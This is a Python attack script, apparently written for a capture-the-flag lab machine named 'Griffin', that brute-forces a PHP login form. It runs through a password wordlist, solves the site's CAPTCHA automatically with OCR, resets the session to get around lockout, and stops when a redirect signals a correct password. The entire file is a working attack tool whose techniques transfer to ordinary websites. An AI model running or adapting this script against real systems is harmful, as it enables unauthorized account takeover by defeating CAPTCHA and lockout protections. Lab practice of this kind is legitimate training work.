#!/usr/bin/python3

import signal, requests, ddddocr, sys, time
from io import BytesIO
from pwn import *
from bs4 import BeautifulSoup
import argparse
import onnxruntime as ort

# Global vars
headers = {
    "Host": "10.10.10.1",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0:",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
}
parser = argparse.ArgumentParser(description='Brute force on the Griffin machine')
parser.add_argument( "--wordlist","-w", help='Define the Dictionary',
                    required=True)
parser.add_argument("--url","-u", help='Define the URL',required=True)
parser.add_argument("--username", "-U", help='Define username', required=True)
parser.add_argument("--cookie", "-c", help='Define cookie', required=True)
args = parser.parse_args()

mainurl = args.url
wordlist = args.wordlist
cookies = {"PHPSESSID":args.cookie}

# suppress warnings
ort.set_default_logger_severity(3)

# Force exit CTL + C
def def_handler(sig, frame):
    print('\n\n[!] Saliendo ......\n\n')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# To solved captcha
def getCaptcha():

    url = mainurl + "/family/captcha.php"
    img_bytes = requests.get(url=url, cookies=cookies,headers=headers)
    img_bytes = BytesIO(img_bytes.content)
    ocr = ddddocr.DdddOcr()
    return ocr.classification(img_bytes.getvalue()).strip().upper()

# To solved the blockage issue
def resetLogin():

    url = mainurl + "/family/index.php?reset=1"
    response = requests.get(url=url, cookies=cookies, headers=headers)

# Message Handling process
def messageTra(response):

    soup = BeautifulSoup(response.text, "html.parser")
    message = soup.find("div", class_="error-message")
    message = message.text.strip() if message else ''
    return message

# Sen Request
def requestWeb(password):
    captcha = getCaptcha()
    values = {'username': args.username,'password': password,'captcha': captcha}
    response = requests.post(url=mainurl+'/family/index.php', headers=headers,
                 cookies=cookies, data=values, allow_redirects=False)
    return response

def bruteForce(file):

    p1 = log.progress('Username')
    p2 = log.progress('Password')
    p3 = log.progress('Message')
    p1.status(args.username)
    p2.status('Starting...')

    time.sleep(3)

    with open(file, "r") as file:
        for password in file:

            time.sleep(0.25)

            p2.status(password)
            response = requestWeb(password.strip())
            message = messageTra(response)
            p3.status(message)

            if "Reset Session" in response.text:
                resetLogin()
                requestWeb(password)
            elif response.status_code == 302:
                p3.status('Correct Password!')
                sys.exit(0)
            elif 'Invalid security code!' in response.text:
                requestWeb(password)

def main():
    os.system('clear')
    print("\tBrute force attack\n")
    bruteForce(wordlist)

if __name__ == "__main__":
    main()
